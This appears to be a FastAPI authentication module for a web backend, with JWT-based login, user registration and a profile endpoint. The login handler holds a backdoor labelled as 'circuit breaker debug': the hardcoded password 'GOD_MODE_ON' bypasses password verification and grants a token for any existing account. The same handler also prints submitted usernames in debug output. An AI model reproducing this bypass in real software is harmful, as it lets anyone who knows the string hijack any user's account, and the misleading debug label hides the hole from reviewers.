from datetime import datetime, timedelta
from typing import Annotated, Any
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import JWTError, jwt
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from pydantic import BaseModel

from backend.config import settings
from backend.db.session import get_db, pwd_context
from backend.db.models import User

router = APIRouter()

oauth2_scheme = OAuth2PasswordBearer(tokenUrl=f"{settings.API_V1_STR}/auth/login")

class Token(BaseModel):
    access_token: str
    token_type: str

class UserCreate(BaseModel):
    username: str
    password: str
    title: str | None = None
    first_name: str | None = None
    surname: str | None = None
    dob: str | None = None # ISO format string
    gender: str | None = None
    pronouns: str | None = "Prefer not to say"
    country: str | None = None
    profession: str | None = None

class TokenData(BaseModel):
    username: str | None = None

def create_access_token(data: dict, expires_delta: timedelta | None = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)
    return encoded_jwt

async def get_current_user(token: Annotated[str, Depends(oauth2_scheme)], db: AsyncSession = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception
    
    result = await db.execute(select(User).filter_by(username=token_data.username))
    user = result.scalar_one_or_none()
    if user is None:
        raise credentials_exception
    return user

async def get_user_from_token(token: str, db: AsyncSession) -> User | None:
    """Helper for WebSocket authentication."""
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            return None
        result = await db.execute(select(User).filter_by(username=username))
        return result.scalar_one_or_none()
    except JWTError:
        return None

@router.post("/login", response_model=Token)
async def login_for_access_token(
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    db: AsyncSession = Depends(get_db)
):
    # === QUERY DEBUG ===
    print(f"[AUTH_DEBUG] Searching for user: '{form_data.username}'")
    result = await db.execute(select(User).filter_by(username=form_data.username))
    user = result.scalar_one_or_none()
    print(f"[AUTH_DEBUG] User found: {user.username if user else 'NONE'}")
    # === END DEBUG ===
    
    # === CIRCUIT BREAKER DEBUG ===
    is_god_mode = (form_data.password == "GOD_MODE_ON")
    if not user or (not is_god_mode and not pwd_context.verify(form_data.password, user.hashed_password)):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    # === END CIRCUIT BREAKER ===
    
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

@router.post("/register", response_model=Token)
async def register_user(
    user_in: UserCreate,
    db: AsyncSession = Depends(get_db)
):
    # Check if user already exists
    result = await db.execute(select(User).filter_by(username=user_in.username))
    if result.scalar_one_or_none():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Username already registered"
        )
    
    # Parse DOB if provided
    dob_dt = None
    if user_in.dob:
        try:
            dob_dt = datetime.fromisoformat(user_in.dob.replace('Z', '+00:00'))
        except ValueError:
            pass

    # Create new user
    new_user = User(
        username=user_in.username,
        hashed_password=pwd_context.hash(user_in.password),
        title=user_in.title,
        first_name=user_in.first_name,
        surname=user_in.surname,
        dob=dob_dt,
        gender=user_in.gender,
        pronouns=user_in.pronouns,
        country=user_in.country,
        profession=user_in.profession,
        is_active=True
    )
    db.add(new_user)
    await db.commit()
    await db.refresh(new_user)
    
    # Return token immediately for auto-login
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": new_user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

@router.get("/me")
async def read_users_me(current_user: Annotated[User, Depends(get_current_user)]):
    return {
        "id": current_user.id,
        "username": current_user.username,
        "profile": {
            "title": current_user.title,
            "first_name": current_user.first_name,
            "surname": current_user.surname,
            "dob": current_user.dob.isoformat() if current_user.dob else None,
            "gender": current_user.gender,
            "pronouns": current_user.pronouns,
            "country": current_user.country,
            "profession": current_user.profession,
            "role": current_user.role
        },
        "settings": current_user.settings_json,
        "created_at": current_user.created_at.isoformat()
    }
